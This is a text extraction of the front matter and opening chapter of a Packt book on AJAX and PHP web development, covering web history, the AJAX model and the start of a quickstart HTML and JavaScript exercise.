Larger Text,Smaller Text,Symbol
About the Reviewer,"Kalpesh Barot
  has about five years of experience in the world of PHP. He has worked 
 extensively on small- and large-scale social networking websites developed in PHP. He 
 has been involved in varied projects, from planning and developing websites to creating 
 custom modules on big social networking websites.
  
 He received a Masters degree in Enterprise Software Engineering from University of 
 Greenwich, UK. There he learned the theory behind his computer experience and 
 became a much more efficient computer programmer.
  
 He has worked actively in the IT sector since his freshman year at the university. He 
 has been a PHP developer since then and has developed his skills in this field.
  
 Through his increasing responsibilities, he has learned to prioritize needs and wants, 
 and applies this ability to his projects. He has acted as a technical reviewer for 
 OOP with 
 PHP
  for Packt Publishing. 
  
 I would like to thank my wife, Bansari Barot, for her continued 
 support in all my projects and Rajashree Hamine for her constant 
 efforts in reminding me to review the chapters on time.
  
  
  
 This material is copyright and is licensed for the sole use by Sue Brandreth on 29th October 2012 
 26 High Road, Beeston, Sandy, Bedfordshire, SG19 1PA",NA
Table of Contents,"Preface 
  
 1
  
 Chapter 1: The World of AJAX and PHP 
  
 7
  
 The big picture 
  
 8
  
 AJAX and Web 2.0 
  
 9
  
 Building websites since 1990 
  
 10
  
 HTTP and HTML 
  
 10
  
 PHP and other server-side technologies 
  
 11
  
 JavaScript and other client-side technologies 
  
 12
  
 What's missing? 
  
 13
  
 The world of AJAX 
  
 14
  
 What is AJAX made of? 
  
 16
  
 Uses and misuses of AJAX 
  
 17
  
 Resources and tools 
  
 19
  
 Setting up your environment 
  
 19
  
 Building a simple application with AJAX and PHP 
  
 20
  
 Summary 
  
 34
  
 Chapter 2: JavaScript and the AJAX Client 
  
 35
  
 JavaScript and the Document Object Model 
  
 36
  
 JavaScript events and the DOM 
  
 41
  
 Even more DOM 
  
 46
  
 JavaScript, DOM, and CSS 
  
 50
  
 Using the XMLHttpRequest object 
  
 54
  
 Creating the XMLHttpRequest object 
  
 55
  
 JavaScript exception handling 
  
 56
  
 Creating better objects for Internet Explorer 6 
  
 59
  
 Initiating server requests using XMLHttpRequest 
  
 60
  
 Handling server response 
  
 63
  
  
 This material is copyright and is licensed for the sole use by Sue Brandreth on 29th October 2012 
 26 High Road, Beeston, Sandy, Bedfordshire, SG19 1PA",NA
Preface,"AJAX is a complex phenomenon that means different things to different people. 
  
 Computer users appreciate that their favorite websites are now friendlier and feel more 
 responsive. Web developers learn new skills that empower them to create sleek web 
 applications with little effort. Indeed, everything sounds good about AJAX! 
  
 At its roots, AJAX is a mix of technologies that lets you get rid of the evil page reload, 
 which represents the dead time when navigating from one page to another. Eliminating 
 page reloads is just one step away from enabling more complex features into websites, 
 such as real-time data validation, drag-and-drop, and other tasks that weren't 
 traditionally associated with web applications. Although the AJAX ingredients are 
 mature (the 
 XMLHttpRequest
  object, which is the heart of AJAX, was created by 
 Microsoft in 1999), their new role in the new wave of web trends is very young, and 
 we'll witness a number of changes before these technologies will be properly used to the 
 best benefit of the end users.
  
 AJAX isn't, of course, the answer to all the Web's problems, as the current hype around it 
 may suggest. As with any other technology, AJAX can be overused, or used the wrong 
 way. AJAX also comes with problems of its own: you need to fight with browser 
 inconsistencies, AJAX-specific pages don't work on browsers without JavaScript, they 
 can't be easily bookmarked by users, and search engines don't always know how to 
 parse them. Also, not everyone likes AJAX. While some are developing enterprise 
 architectures using JavaScript, others prefer not to use it at all. 
  
 When the hype is over, most will probably agree that the middle way is the wisest way 
 to go for most scenarios. 
  
 In 
 AJAX and PHP: Building Modern Web Applications – Second Edition
 , we take a pragmatic 
 and safe approach by teaching relevant patterns and best practices that we think any web 
 developer will need sooner or later. We teach you how to avoid the common pitfalls, how 
 to write efficient AJAX code, and how to achieve functionality that is easy to integrate into 
 current and future web applications, without requiring you to rebuild the whole solution 
 around AJAX. You'll be able to use the knowledge you learn from this book right away, in 
 your PHP web applications. 
  
  
 This material is copyright and is licensed for the sole use by Sue Brandreth on 29th October 2012 
 26 High Road, Beeston, Sandy, Bedfordshire, SG19 1PA",NA
What this book covers,"Chapter 1: The World of AJAX and PHP
  is all about a quick introduction to the world of 
 AJAX. In order to proceed with learning how to build AJAX applications, it's important 
 to understand why and where they are useful. It describes the 
 XMLHttpRequest
  
 object, which is the key element that enables the client-side JavaScript code to call a 
 page on the server asynchronously.
  
 Chapter 2:JavaScript and the AJAX Client
  walks you through many fields such as 
 working with HTML, JavaScript, CSS, the DOM, XML, and 
 XMLHttpRequest
 . 
  
 It discusses the theory (and practice) that you will need to know to make these 
 components come together smoothly, and form a solid foundation for your future 
 AJAX applications. It also shows you how to implement simple error-handling 
 techniques, and how to write code efficiently.
  
 Chapter 3:Object Oriented JavaScript
  covers a large area of what object-oriented 
 programming means in the world of JavaScript starting from basic features and 
 going far into the execution context of functions. It teaches you the basic OOP 
 concepts—encapsulation, polymorphism, and inheritance, how to work with 
 JavaScript objects, functions, classes, and prototypes, how to simulate private, 
 instance, and static class members in JavaScript, what the JavaScript execution 
 context is, how to implement inheritance by using constructor functions and 
 prototyping, and the basics of JSON.
  
 Chapter 4:Using PHP and MySQL on the Server
  starts putting the server to work, using 
 PHP to generate dynamic output, and MySQL to manipulate and store the backend data. 
 This chapter shows you how to use XML and JSON with PHP (so that you can create 
 server-side code that communicates with your JavaScript client), how to implement 
 error-handling code in your server-side PHP code, and how to work with MySQL 
 databases.
  
 Chapter 5:AJAX Form Validation
  creates a form validation application that 
  
 implements traditional techniques with added AJAX flavor, thereby making the form more 
 user-friendly, responsive, and pleasing. The intention of this chapter isn't to build the 
 perfect validation technique but, rather, a working proof of concept that takes care of user 
 input and ensures its validity.
  
 Chapter 6:Debugging and Profiling AJAX Applications
  teaches how to enable and use 
 Internet Explorer's debugging capabilities. It shows how you can work with Web 
 Development Helper, Developer Toolbar, and other Internet Explorer tools and with 
 Firefox plugins such as Firebug, Venkman JavaScript Debugger, and Web Developer.
  
 [
  2 
 ]
  
  
 This material is copyright and is licensed for the sole use by Sue Brandreth on 29th October 2012 
 26 High Road, Beeston, Sandy, Bedfordshire, SG19 1PA",NA
What you need for this book,"To go through the examples in this book you need PHP 5, a web server, and a 
 database server. We have tested the code under several environments, but mostly 
 with the Apache 2 web server, and MySQL 4.1 and MySQL 5 databases. 
  
 You can choose, however, to use another web server, or another database product, in 
 which case the procedures presented in the chapters might not be 100% accurate. It is 
 important to have PHP 5 or newer, because we use some features, such as Object 
 Oriented Programming support, which aren't available in older versions. 
  
 Please read the appendix for more details about setting up your machine. If your 
 machine already has the required software, you still need to read the final part of 
 appendix, where you are instructed about creating a database that is used for the 
 examples in this book.",NA
Who this book is for,"This book is written for PHP developers who want to learn how to use PHP, JavaScript, 
 MySQL, and jQuery to implement Web 2.0 applications, are looking for a step-by-step, 
 example-driven AJAX tutorial, want to learn advanced AJAX coding patterns and 
 techniques, and want to be able to assess the security and SEO implications of their 
 code.
  
 [
  3 
 ]
  
  
 This material is copyright and is licensed for the sole use by Sue Brandreth on 29th October 2012 
 26 High Road, Beeston, Sandy, Bedfordshire, SG19 1PA",NA
Conventions ,"In this book, you will find a number of styles of text that distinguish between 
 different kinds of information. Here are some examples of these styles, and an 
 explanation of their meaning.
  
 Code words in text are shown as follows: ""We can include other contexts through the use 
 of the 
 include
  directive.""
  
 A block of code is set as follows: 
  
  // create the second <ui> element and add a text node to it 
 oLiOrange = document.createElement(""li"");
  
  oOrange = document.createTextNode(""Orange"");
  
  oLiOrange.appendChild(oOrange);
  
 When we wish to draw your attention to a particular part of a code block, the 
 relevant lines or items are set in bold:
  
  // create the second <ui> element and add a text node to it 
 oLiOrange = document.createElement(""li"");
  
  oOrange = document.createTextNode(""Orange"");
  
  oLiOrange.appendChild(oOrange);
  
 Any command-line input or output is written as follows:
  
 tar xvfz xampp-linux-X.Y.Z.tar.gz -C /opt
  
 New terms
  and 
 important words
  are shown in bold. Words that you see on the screen, 
 in menus or dialog boxes for example, appear in the text like this: ""Now click on the 
 Start 
 Debugging
  button. If you receive a confirmation window like that in the following 
 screenshot, click on 
 OK
 "".
  
  
 Warnings or important notes appear in a box like this.
  
  
  
 Tips and tricks appear like this.
  
  
 [
  4 
 ]
  
  
 This material is copyright and is licensed for the sole use by Sue Brandreth on 29th October 2012 
 26 High Road, Beeston, Sandy, Bedfordshire, SG19 1PA",NA
Reader feedback,"Feedback from our readers is always welcome. Let us know what you think about this 
 book—what you liked or may have disliked. Reader feedback is important for us to 
 develop titles that you really get the most out of. 
  
 To send us general feedback, simply send an email to 
 feedback@packtpub.com
 , and 
 mention the book title via the subject of your message.
  
 If there is a book that you need and would like to see us publish, please send us 
 a note in the 
 SUGGEST A TITLE
  form on 
 www.packtpub.com
  or email 
 suggest@packtpub.com
 .
  
 If there is a topic that you have expertise in and you are interested in either writing or 
 contributing to a book on, see our author guide on 
 www.packtpub.com/authors
 .",NA
Customer support,"Now that you are the proud owner of a Packt book, we have a number of things to help 
 you to get the most from your purchase.
  
  
 Downloading the example code for the book
  
  
 Visit 
 http://www.packtpub.com/files/code/7726_Code.zip
  
 to directly download the example code.
  
 The downloadable files contain instructions on how to use them.",NA
Errata,"Although we have taken every care to ensure the accuracy of our content, mistakes do 
 happen. If you find a mistake in one of our books—maybe a mistake in the text or the 
 code—we would be grateful if you would report this to us. By doing so, you can save other 
 readers from frustration, and help us to improve subsequent versions of this book. If you 
 find any errata, please report them by visiting 
 http://www.packtpub. com/support
 , 
 selecting your book, clicking on the 
 let us know
  link, and entering the details of your 
 errata. Once your errata are verified, your submission will be accepted and the errata 
 added to any list of existing errata. Any existing errata can be viewed by selecting your 
 title from 
 http://www.packtpub.com/support
 .
  
 [
  5 
 ]",NA
Piracy,"Piracy of copyright material on the Internet is an ongoing problem across all media. At 
 Packt, we take the protection of our copyright and licenses very seriously. If you come 
 across any illegal copies of our works, in any form, on the Internet, please provide us 
 with the location address or website name immediately so that we can pursue a remedy. 
  
 Please contact us at 
 copyright@packtpub.com
  with a link to the suspected 
 pirated material.
  
 We appreciate your help in protecting our authors, and our ability to bring you 
 valuable content.",NA
Questions,"You can contact us at 
 questions@packtpub.com
  if you are having a problem with any 
 aspect of the book, and we will do our best to address it.
  
 [
  6 
 ]",NA
The World of AJAX and PHP,"""Computer, draw a robot!"" said my young cousin to the first computer he had ever seen. 
 (As I had instructed it not to listen to strangers, the computer wasn't receptive to this 
 command.) If you're like me, your first thought would be 
 how silly
  or 
 how funny
 —but 
 this is a mistake. We're being educated to accommodate computers, to compensate for 
 the lack of ability of computers to understand humans, but in an ideal world, that 
 spoken command should have been enough to have the computer please my cousin.
  
 This book doesn't aim to teach you to create software applications that 
  
 intelligently interact with children—we're still far from that point. However, we'll help 
 you take a small but important step in that direction. We'll teach you how to best use 
 web development technologies available today—AJAX and PHP in particular—to 
 enhance web users' experience with your website, by creating more usable and friendly 
 web interfaces. As far as this chapter is concerned, we'll discuss the following topics:
  
 •
  
 •
  
 •
  
 •
  
 The big picture
 : Here we'll answer a question we're often asked: 
 Why bother 
 improving our applications' user interfaces and features, when the existing ones 
 perform satisfactorily?
  
 Building websites since 1990
 : What are the fundamental principles of the Web, 
 and what are the important technologies that make it work? You probably know 
 most of this, but we hope you'll welcome this quick refresher.
  
 The world of AJAX
 : As you will learn, AJAX is a powerful tool to improve your 
 web interfaces. However, it's important to understand when you should and 
 shouldn't use it. We'll also discuss the basic principles of AJAX, and refer to online 
 resources and tools that can help you along the way.
  
 Setting up your environment
 : In this book, you'll find plenty of 
 code—and be anxious to see it in action. We've taken care of that by 
 including step-by-step instructions with every exercise.",NA
The big picture,"The story about Cristian's seven-year-old cousin (which happened back in 1990) is still 
 relevant today. The ability of technology to be user-friendly has evolved quite a bit, but 
 there's still a long way to go before we have computers that self-adapt to our needs. For 
 now, people must 
 learn
  how to work with computers—some even end up loving a black 
 screen with a tiny command prompt on it!
  
 We will be very practical and concise in this book, but before getting back to your 
 favorite mission (writing code )—it's worth taking a little step back . It's easy to forget 
 that 
 the very reason technology exists is to serve people
 , and make their lives more 
 entertaining at home and more efficient at work.
  
 The working habits of many are driven by software with intuitive (and enjoyable) user 
 interfaces. Successful companies are typically one step ahead of their 
  
 competition in offering their users more simple and natural ways to achieve their 
 goals—explaining the popularity of the mouse, features such as 
 drag-and-drop
 , and 
 that simple textbox that searches the entire Web for you in just 0.1 seconds (or so it 
 says). 
  
 Understanding the way people's brains work is one key to building the ultimate 
 software application. We know that end users need intuitive user interfaces; they don't 
 really care what operating system they're running as long as the functionality they get 
 is what they want. The art of meeting users' interface expectations, understanding the 
 nature of their work, and building software applications accordingly is referred to as 
 softwareusability.
  
 In the past, when users were specifically technically trained, the behavior of any 
 software that interacted with humans was less important. Business needs today 
 dictate that users aren't necessarily technically trained—administrative staff don't 
 usually hold degrees in Computer Science, but still need to deliver good-looking 
 reports for the sales manager, and easily create data entry forms for the sales force.
  
 [
  8 
 ]",NA
AJAX and Web 2.0,"These days, it's increasingly difficult to discuss AJAX without mentioning Web 2.0 
 (
 http://en.wikipedia.org/wiki/Web_2
 ). What is Web 2.0? Initially, Web 2.0 was 
 associated with the 
 Semantic Web
  (
 http://en.wikipedia.org/wiki/Semantic_ 
 web
 ). The Semantic Web is envisioned to be the next step in the Web's evolution, based 
 on online social-networking applications, using tag-based 
 folksonomies
  (user-generated 
 tags for data categorization). Some say it is simply a marketing buzzword without any 
 special meaning, while others use this term to describe the new, open, interactive Web 
 that facilitates online information sharing and collaboration. 
  
 Controversies aside, the version number is an allusion to the recent changes of the 
 World Wide Web. The new generation of web applications offers a richer user 
 experience, much closer to that of desktop applications, while using live data from the 
 Internet. In the world of Web 2.0, AJAX plays an essential role providing the 
 technological support to implement rich and responsive web interfaces.
  
 [
  9 
 ]",NA
Building websites since 1990,"Before getting into the details, let's take the inevitable history lesson to make sure 
 we've got our definitions straight. We promise we'll keep this 
 short
 . If you're a web 
 development veteran, feel free to skip ahead to 
 The world of AJAX
  section.
  
 Although the history of the Internet is a bit longer, 1991 is the year when 
 HyperText 
 TransferProtocol
  (
 HTTP
 ), still used to transfer data over the Internet, was invented. In 
 its initial versions, it didn't do much more than opening and closing connections. 
  
 The later versions of HTTP (Version 1.0 appeared in 1996 and Version 1.1 in 1999) 
 became the protocol that we all know and use.",NA
HTTP and HTML,"HTTP is supported by all web browsers, and it does its original job very 
  
 well—retrieving simple web content. Whenever you request a web page using your 
 favorite web browser, the HTTP protocol is assumed. So, for example, when you type 
 www.msn.com
  in the location bar of your web browser, it will assume by default that 
 you meant 
 http://www.msn.com
 .
  
 The standard document type of the Web is 
 HyperTextMarkupLanguage 
  
 (HTML
 )—a markup language that dictates a document's formatting and layout of 
 static text and images
 . When you need to get to another HTML page via HTTP, you 
 initiate a full page reload, and the HTML page you requested must already exist as a 
 static document at the mentioned location prior to the request—it only enables users 
 to retrieve static content (HTML pages) from the Internet. HTTP and HTML are still a 
 very successful pair and are the foundation of the Web as we know it today. Figure 1-1  
 shows a simple transaction when a user requests a web page from the Internet using 
 the HTTP protocol:
  
  
 user
  
 web client
  
 client requests 
  
 index.html via HTTP
  
 web server
  
 web server replies by 
 sending back the 
  
 contents of index.html
  
 Figure 1-1:  A simple HTTP request
  
 [
  10 
 ]",NA
PHP and other server-side technologies,"There are several technologies (or languages) that are supported to create the server-
 side logic (PHP, ASP.NET, Java Server Pages (JSP), Perl, ColdFusion, Ruby on Rails, and 
 others), each with their own merits and drawbacks. For our server-side implementation 
 we've chosen PHP, an open source scripting language offering a solid and widely-used 
 development platform. Instead of sending back a static page, the server executes the 
 code in the PHP page and sends back the results. 
  
 (These results must still be in the form of HTML, or in another format that the 
 client understands.) 
  
 [
  11 
 ]",NA
JavaScript and other client-side technologies,"Client-side technologies differ in many ways, beginning with the way they are 
 loaded and executed by the web client. Let's take a look at one of these 
 technologies—JavaScript.
  
 JavaScript
  is a language in its own right. Its code is written in plain text and can be 
 embedded into HTML pages to empower them. It is supported by most of the web 
 browsers without requiring users to install new components on the system and has 
 object-oriented capabilities (although perhaps differing from the OOP model(s) you are 
 familiar with already).
  
 JavaScript is a scripting language—not a compiled language—so it's not suited for 
 intensive calculations or writing device drivers, and it must arrive whole at the client to 
 be interpreted. This potential security issue doesn't make it suited for writing sensitive 
 business logic (this wouldn't be a recommended practice anyway), but it does a good job 
 when used for the right purposes.
  
 With JavaScript, developers could finally build web pages that ""did"" things 
  
 (remember the days of snow falling on a page?). With client-side form validation, users 
 no longer cause a whole page to reload if they fail to fill out the form correctly 
 (irritatingly losing all the previously typed data in the process). Despite its potential, 
 JavaScript was never used consistently to make the Web experience more user friendly 
 like desktop applications.
  
 [
  12 
 ]",NA
What's missing?,"With all these options for developing powerful features inside web browsers, why 
 would anyone want anything new? What's missing?
  
 As pointed out in the beginning of the chapter, technology exists to serve existing 
 market needs. Part of the market wants to deliver more powerful functionality to web 
 clients without using Flash, Java applets, or other technologies that are considered 
 either too flashy or heavy-weight for certain purposes. A typical example is that of 
 interactive form validation, where the data typed by the visitor must be checked against 
 some validation rules coded on the server for compliancy.
  
 For such scenarios, developers created websites and web applications using HTML, 
 JavaScript, and PHP (or another server-side technology). The typical request with this 
 scenario is shown in Figure 1-3. It shows an HTTP request, the response made up of 
 HTML, and JavaScript built programmatically with PHP.
  
  
 user
  
 web client
  
 client requests
  
 a PHP page
  
 server executes the 
 PHP page and builds 
 an HTML response
  
 response containing 
 HTML and JavaScript
  
 web server
  
 Figure 1-3: HTTP, HTML, ASP.NET, and JavaScript in action
  
 [
  13 
 ]",NA
The world of AJAX,"AJAX is an acronym for Asynchronous JavaScript and XML. The key element here is 
 Asynchronous. Simply put, AJAX offers a technique to make background server calls via 
 JavaScript and retrieve additional data as needed, updating portions of the page without 
 causing full page reloads. Figure 1-4 offers a visual representation of what happens when 
 a typical AJAX-enabled web page is requested by a visitor:
  
  
 web client
  
 client requests a
  
 PHP
  
 page
  
 server executes the 
  
 PHP page and builds 
  
 an HTML response
  
 response containing HTML 
 and JavaScript
  
 user
  
 web server
  
 javascript code makes 
 invisible call to server
  
 server replies by sending 
  
 the requested data
  
 javascript updates the 
  
 web page using this data
  
 Figure 1-4: A typical AJAX call
  
 AJAX solves the balance between the client and server by allowing them to 
 communicate in the background 
 while the user is working
  on the page.
  
 Consider web registration forms where the user is asked to enter data (such as name, 
 email address, password, credit card number, and so on) that must be validated before 
 proceeding to the next step of the registration process. There are three possible ways to 
 implement this:
  
 •
  
 Let the user type all the required data, 
 submit
  the page, and then perform the 
 validation on the server. If the validation doesn't succeed, the server sends back 
 the (sometimes empty) form, asking the visitor to correct the invalid entries. In 
 this scenario, the user experiences 
 dead time
  (a delay) between submitting and 
 waiting for response. 
  
 [
  14 
 ]",NA
What is AJAX made of?,"The technologies AJAX is made of are already implemented in all modern web 
 browsers, so the client doesn't need to install any extra modules to run an AJAX 
 website. AJAX is made up of the following:
  
 •
  
 •
  
 JavaScript
 , the essential ingredient of AJAX, allows you to build the client-
 side functionality. In the JavaScript functions, we'll use the 
  
 DocumentObjectModel
  (
 DOM
 ) to manipulate parts of the HTML page. 
  
 The 
 XMLHttpRequest
  object, the component that enables JavaScript to 
 access the server asynchronously in the background. 
  
 [
  16 
 ]",NA
Uses and misuses of AJAX,"As noted earlier, AJAX can improve your visitors' experience with your website, but it 
 can also worsen it when used inappropriately. Unless your application has really special 
 requirements, it's wise to let your users navigate your content using good old 
 hyperlinks. Web browsers have a long history of dealing with content navigation, and 
 web users have a long history of using these browsers. In the vast majority of cases, 
 AJAX is best used in addition to the traditional web development paradigms, rather than 
 changing or replacing them.
  
 [
  17 
 ]",NA
Resources and tools,"AJAX enjoys an active community and a veritable plethora of resources, guides, 
 toolkits, frameworks, forums, and tutorials. Whether you're a veteran developer 
 or working with AJAX for the first time, it's well worth your time to peruse these 
 resources. 
  
 We are listing a few places to get you started that may help you in your journey into the 
 exciting world of AJAX. Some are server-agnostic, while others are specifically created 
 for ASP.NET, Java, PHP, Coldfusion, Flash, and Perl backends. Among the most popular 
 server-agnostic toolkits are 
 Dojo
  (
 http://dojotoolkit.org
 ), 
 Prototype
  
 (
 http://prototypejs.org/
 ), script.aculo.us (
 http://script.aculo. us
 ), and 
 jQuery
  (
 http://jquery.com/
 )—which you'll be using in this book as well.
  
 For starters, here are a few useful generic AJAX resources:
  
 •
  
 •
  
 •
  
 http://www.ajaxian.com
  is the AJAX website of Ben Galbraith and Dion 
 Almaer, the authors of 
 PragmaticAjax
  (Pragmatic Bookshelf, 2006).
  
 http://ajaxpatterns.org
  is an informational website about AJAX design 
 patterns, and the home page of 
 Ajax Design Patterns
  by Michael Mahemoff 
 (O'Reilly, 2006).
  
 http://www.fiftyfoureleven.com/resources/programming/
  
 xmlhttprequest
  is a comprehensive article collection about AJAX.
  
 •
  
 •
  
 •
  
 http://www.sitepoint.com/subcat/javascript
  is Sitepoint's AJAX 
 home, featuring excellent articles.
  
 http://developer.mozilla.org/en/docs/AJAX
  is Mozilla's page on AJAX.
  
 http://en.wikipedia.org/wiki/Ajax
  is the Wikipedia page on AJAX.
  
 The list is by no means complete. If you need more online resources, search engines will 
 be of help.",NA
Setting up your environment,"Before moving on, ensure you've prepared your working environment as shown in 
 the Appendix, where you're guided through installation and setup of PHP and 
 Apache, and set up the database used for the examples in this book. (You won't need 
 a database for the first example though.)
  
 [
  19 
 ]",NA
Building a simple application with AJAX ,NA,NA
and PHP,"This exercise is for those readers willing to start coding ASAP, but it 
  
  
 assumes you're already familiar with JavaScript, PHP, and XML. If this is 
  
 not the case, or if at any time you feel this exercise is too challenging, feel 
  
 free to skip to Chapter 2. In Chapter 2 and Chapter 3, we'll have a much 
  
 closer look at the AJAX technologies and techniques and everything will 
  
 become clear.
  
 You'll create a simple AJAX web application called 
 quickstart
  where the user is 
 asked to enter his or her name and the server sends back responses as they type. 
  
 Figure 1-6 shows the initial page, 
 index.html
 , loaded by the user. (Note that 
 index.html
  gets loaded by default when requesting the 
 quickstart
  web folder, 
 even if the file name is not explicitly mentioned.)",NA
Time for action – Quickstart AJAX,"1. In the Appendix, you're instructed to set up a web server, and create a web-
 accessible folder called 
 ajax
  to host all your code for this book. Under the 
 ajax
  folder, create a new folder called 
 quickstart
 . 
  
 2. In the 
 quickstart
  folder, create a file called 
 index.html
 , and add the 
  
 following code to it:
  
 <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Transitional//EN"" 
 ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"">
  
 <html xmlns=""http://www.w3.org/1999/xhtml"">
  
  <head>
  
  <title>AJAX with PHP, 2nd Edition: Quickstart</title>
  
  <script type=""text/javascript"" src=""quickstart.js""></script>
  
  </head>
  
  <body onload='process()'>
  
  Server wants to know your name: 
  
  <input type=""text"" id=""myName"" />
  
  <div id=""divMessage"" />
  
  </body>
  
 </html>
  
 3. Create a new file called 
 quickstart.js
 , and add the following code in it:
  
 // stores the reference to the XMLHttpRequest object
  
 var xmlHttp = createXmlHttpRequestObject(); 
  
 // retrieves the XMLHttpRequest object
  
 [
  23 
 ]",NA
